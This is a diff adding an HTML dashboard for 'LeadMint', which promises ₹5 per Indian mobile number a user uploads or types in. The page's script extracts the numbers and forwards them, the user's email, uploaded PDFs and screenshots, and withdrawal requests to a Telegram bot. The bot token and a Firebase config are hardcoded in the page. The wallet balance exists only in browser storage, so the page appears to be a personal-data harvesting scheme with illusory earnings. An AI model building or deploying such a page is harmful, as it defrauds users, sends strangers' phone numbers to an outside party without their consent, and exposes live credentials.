@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>LeadMint Dashboard | Earn ₹5/Lead</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <script type="importmap">
+    {
+      "imports": {
+        "firebase/app": "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js",
+        "firebase/auth": "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js"
+      }
+    }
+  </script>
+  <style>
+    *{ margin:0; padding:0; box-sizing:border-box; }
+    body{ font-family:'Inter',sans-serif; background:#f0f2f5; padding:24px; }
+    .dashboard-container{ max-width:1400px; margin:0 auto; }
+    .header{ display:flex; justify-content:space-between; align-items:center; background:white; padding:16px 28px; border-radius:28px; margin-bottom:28px; box-shadow:0 2px 8px rgba(0,0,0,0.04); }
+    .logo{ font-size:26px; font-weight:800; background:linear-gradient(135deg,#0f2b3d,#1e6b5e); -webkit-background-clip:text; background-clip:text; color:transparent; }
+    .balance-card{ background:linear-gradient(145deg,#0f2b3d,#124a5e); color:white; border-radius:32px; padding:28px; margin-bottom:28px; display:flex; justify-content:space-between; flex-wrap:wrap; gap:20px; }
+    .balance{ font-size:42px; font-weight:800; }
+    .grid-2{ display:grid; grid-template-columns:1fr 1fr; gap:28px; margin-bottom:28px; }
+    .card{ background:white; border-radius:28px; padding:24px; box-shadow:0 4px 12px rgba(0,0,0,0.04); }
+    .full-width{ grid-column:span 2; }
+    textarea, input, select{ width:100%; padding:14px; border:1px solid #e2e8f0; border-radius:20px; margin:12px 0; font-family:inherit; }
+    button{ background:#0f2b3d; color:white; border:none; padding:12px 24px; border-radius:40px; font-weight:600; cursor:pointer; transition:0.2s; }
+    button:hover{ background:#1e6b5e; transform:translateY(-2px); }
+    .file-zone{ border:2px dashed #cbd5e1; border-radius:24px; padding:32px; text-align:center; margin:16px 0; cursor:pointer; background:#fafcff; }
+    .lead-item{ background:#f8fafc; padding:12px; border-radius:16px; margin:8px 0; font-size:14px; display:flex; justify-content:space-between; }
+    .verified-badge{ color:#1e6b5e; font-weight:bold; }
+    .progress-bar{ background:#e2e8f0; border-radius:40px; height:10px; margin:12px 0; overflow:hidden; }
+    .progress-fill{ background:#1e6b5e; width:0%; height:100%; border-radius:40px; }
+    .withdraw-btn{ background:#eab308; color:#1e293b; margin-top:12px; }
+    .withdraw-btn:disabled{ opacity:0.5; cursor:not-allowed; transform:none; }
+    @media (max-width:800px){ .grid-2{ grid-template-columns:1fr; } .full-width{ grid-column:span 1; } }
+  </style>
+</head>
+<body>
+<div class="dashboard-container">
+  <div class="header">
+    <div class="logo">🔥 LeadMint</div>
+    <div><button id="logoutBtn" class="btn-outline" style="background:#f1f5f9; color:#1e293b;">Logout</button></div>
+  </div>
+
+  <div class="balance-card">
+    <div><h3>💰 Wallet Balance</h3><div class="balance" id="walletBalance">₹0</div><div id="verifiedCountDisplay">0 verified leads</div></div>
+    <div><h3>🔓 Withdraw Lock</h3><div id="lockStatus">🔒 Need 100 verified leads to unlock</div><div class="progress-bar"><div class="progress-fill" id="withdrawProgress"></div></div></div>
+    <div><button id="withdrawBtn" class="withdraw-btn" disabled>💸 Request Withdrawal (Min ₹2000)</button></div>
+  </div>
+
+  <div class="grid-2">
+    <div class="card">
+      <h3>📤 Upload Leads (PDF / CSV / Screenshot)</h3>
+      <p style="color:#475569; font-size:14px;">Upload any file: We auto-extract & verify only Indian mobile numbers. ₹5 credited per valid lead.</p>
+      <div class="file-zone" id="fileDropZone">
+        📁 Click or drag file here<br><small>PDF, CSV, TXT, JPG, PNG (Max 10MB)</small>
+        <input type="file" id="fileInput" style="display:none;" accept=".pdf,.csv,.txt,.jpg,.jpeg,.png">
+      </div>
+      <button id="processFileBtn">🚀 Process & Verify Numbers</button>
+      <div id="uploadStatus" style="margin-top:16px; font-size:14px;"></div>
+    </div>
+
+    <div class="card">
+      <h3>📞 Manual Number Entry</h3>
+      <textarea id="manualNumbers" rows="4" placeholder="Enter mobile numbers (one per line or comma separated)&#10;Example:&#10;9876543210&#10;9123456789"></textarea>
+      <button id="verifyManualBtn">✅ Verify & Add (₹5 each valid)</button>
+      <div id="manualResult"></div>
+    </div>
+
+    <div class="card full-width">
+      <h3>📋 Recent Verified Leads (Last 10)</h3>
+      <div id="recentLeadsList">No leads yet. Upload a file or add manually.</div>
+    </div>
+  </div>
+</div>
+
+<script type="module">
+  import { initializeApp } from "firebase/app";
+  import { getAuth, signOut, onAuthStateChanged } from "firebase/auth";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyDpFohe_piG3MpnpNJDZcGvTqg5tIu3B-I",
+    authDomain: "leadcash-2cb77.firebaseapp.com",
+    projectId: "leadcash-2cb77",
+    storageBucket: "leadcash-2cb77.firebasestorage.app",
+    messagingSenderId: "611052139341",
+    appId: "1:611052139341:web:1c5ea10a24591987827d04"
+  };
+  const app = initializeApp(firebaseConfig);
+  const auth = getAuth(app);
+
+  // TELEGRAM CONFIG
+  const BOT_TOKEN = "8619703516:AAEhJJBKYyir3zOo404Yoqv6FnnPj5Xj4Q4";
+  const CHAT_ID = "6064803354";
+
+  let currentUser = null;
+  let userData = { balance: 0, verifiedLeads: [], totalVerified: 0 };
+
+  function saveToLocal() {
+    if(currentUser) localStorage.setItem(`leadmint_${currentUser.uid}`, JSON.stringify(userData));
+  }
+  function loadUserData(uid) {
+    const stored = localStorage.getItem(`leadmint_${uid}`);
+    if(stored) userData = JSON.parse(stored);
+    else userData = { balance: 0, verifiedLeads: [], totalVerified: 0 };
+    updateUI();
+  }
+  function updateUI() {
+    document.getElementById('walletBalance').innerText = `₹${userData.balance}`;
+    document.getElementById('verifiedCountDisplay').innerText = `${userData.totalVerified} verified leads`;
+    const progressPercent = Math.min(100, (userData.totalVerified / 100) * 100);
+    document.getElementById('withdrawProgress').style.width = `${progressPercent}%`;
+    const withdrawBtn = document.getElementById('withdrawBtn');
+    const canWithdraw = (userData.totalVerified >= 100 && userData.balance >= 2000);
+    withdrawBtn.disabled = !canWithdraw;
+    withdrawBtn.innerText = canWithdraw ? "💸 Request Withdrawal (Min ₹2000)" : (userData.totalVerified<100 ? "🔒 Need 100 verified leads first" : "❌ Need minimum ₹2000 balance");
+    document.getElementById('lockStatus').innerHTML = userData.totalVerified>=100 ? "✅ Withdraw unlocked!" : `🔒 Locked: ${userData.totalVerified}/100 verified leads needed`;
+    const recent = userData.verifiedLeads.slice(-10).reverse();
+    document.getElementById('recentLeadsList').innerHTML = recent.length ? recent.map(l => `<div class="lead-item"><span>📞 ${l.number}</span><span class="verified-badge">✅ +₹5</span><span style="font-size:12px;">${l.date}</span></div>`).join('') : "<div style='padding:20px;text-align:center'>No leads yet</div>";
+    saveToLocal();
+  }
+
+  function sendToTelegram(message, fileBase64=null, filename="screenshot.jpg") {
+    let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+    fetch(url).catch(e=>console.warn);
+    if(fileBase64) {
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      const byteCharacters = atob(fileBase64.split(',')[1]);
+      const byteNumbers = new Array(byteCharacters.length);
+      for (let i = 0; i < byteCharacters.length; i++) byteNumbers[i] = byteCharacters.charCodeAt(i);
+      const blob = new Blob([new Uint8Array(byteNumbers)], {type: 'image/jpeg'});
+      formData.append('photo', blob, filename);
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:formData}).catch(e=>console.warn);
+    }
+  }
+
+  function isValidIndianNumber(num) {
+    const cleaned = num.toString().replace(/\D/g, '');
+    return /^[6-9]\d{9}$/.test(cleaned) && cleaned.length===10;
+  }
+
+  async function processNumbers(numbersArray, sourceType="manual") {
+    const uniqueValid = [...new Map(numbersArray.filter(n => isValidIndianNumber(n)).map(n => [n, n])).values()];
+    if(uniqueValid.length === 0) return { added:0, msg:"No valid Indian mobile numbers found (10 digits, starting 6/7/8/9)." };
+    let newAdded = 0;
+    for(let num of uniqueValid) {
+      if(!userData.verifiedLeads.some(l => l.number === num)) {
+        userData.verifiedLeads.push({ number: num, date: new Date().toLocaleString(), verified: true });
+        userData.balance += 5;
+        userData.totalVerified += 1;
+        newAdded++;
+      }
+    }
+    updateUI();
+    const logMsg = `👤 User: ${currentUser.email}\n✅ Added ${newAdded} verified Indian numbers\n💰 Total Balance: ₹${userData.balance}\n📊 Total Verified: ${userData.totalVerified}\n🔢 Numbers: ${uniqueValid.slice(0,10).join(', ')}${uniqueValid.length>10 ? '...' : ''}`;
+    sendToTelegram(logMsg);
+    return { added:newAdded, msg:`✅ ${newAdded} new verified numbers added! +₹${newAdded*5}` };
+  }
+
+  async function extractFromFile(file) {
+    const text = await file.text();
+    const matches = text.match(/\b[6-9]\d{9}\b/g) || [];
+    return [...new Set(matches)];
+  }
+
+  document.getElementById('fileDropZone').onclick = () => document.getElementById('fileInput').click();
+  document.getElementById('fileInput').onchange = async (e) => {
+    const file = e.target.files[0];
+    if(!file) return;
+    document.getElementById('uploadStatus').innerHTML = "📄 Extracting numbers...";
+    let numbers = [];
+    if(file.type === 'text/csv' || file.type === 'text/plain' || file.name.endsWith('.txt') || file.name.endsWith('.csv')) {
+      numbers = await extractFromFile(file);
+    } else if(file.type === 'application/pdf') {
+      document.getElementById('uploadStatus').innerHTML = "⚠️ PDF text extraction requires backend; using screenshot fallback. Sending to Telegram for manual review.";
+      const reader = new FileReader();
+      reader.onload = () => { sendToTelegram(`📄 PDF Upload by ${currentUser.email}`, reader.result, file.name); };
+      reader.readAsDataURL(file);
+      document.getElementById('uploadStatus').innerHTML = "PDF sent to admin for manual verification. Credits added after review.";
+      return;
+    } else {
+      const reader = new FileReader();
+      reader.onload = () => { sendToTelegram(`🖼️ Screenshot uploaded by ${currentUser.email} — manual verification needed`, reader.result, file.name); };
+      reader.readAsDataURL(file);
+      document.getElementById('uploadStatus').innerHTML = "Screenshot sent to Telegram admin. Verification pending.";
+      return;
+    }
+    const res = await processNumbers(numbers, "file");
+    document.getElementById('uploadStatus').innerHTML = res.msg;
+  };
+
+  document.getElementById('processFileBtn').onclick = () => document.getElementById('fileInput').click();
+  document.getElementById('verifyManualBtn').onclick = async () => {
+    const raw = document.getElementById('manualNumbers').value;
+    const numbers = raw.split(/[\n, ]+/).filter(n => n.trim().length > 0);
+    const res = await processNumbers(numbers, "manual");
+    document.getElementById('manualResult').innerHTML = res.msg;
+    document.getElementById('manualNumbers').value = '';
+  };
+
+  document.getElementById('withdrawBtn').onclick = () => {
+    if(userData.totalVerified >= 100 && userData.balance >= 2000) {
+      const msg = `💰 WITHDRAWAL REQUEST\nUser: ${currentUser.email}\nAmount: ₹${userData.balance}\nUPI: pending (user will provide)`;
+      sendToTelegram(msg);
+      alert(`Withdrawal request of ₹${userData.balance} submitted! Team will contact within 48h.`);
+    } else alert(`Cannot withdraw: need 100+ verified leads (${userData.totalVerified}/100) and min ₹2000 balance.`);
+  };
+
+  document.getElementById('logoutBtn').onclick = () => signOut(auth).then(()=>window.location.href="index.html");
+
+  onAuthStateChanged(auth, (user) => {
+    if(!user) window.location.href = "index.html";
+    else { currentUser = user; loadUserData(user.uid); }
+  });
+</script>
+</body>
+</html>
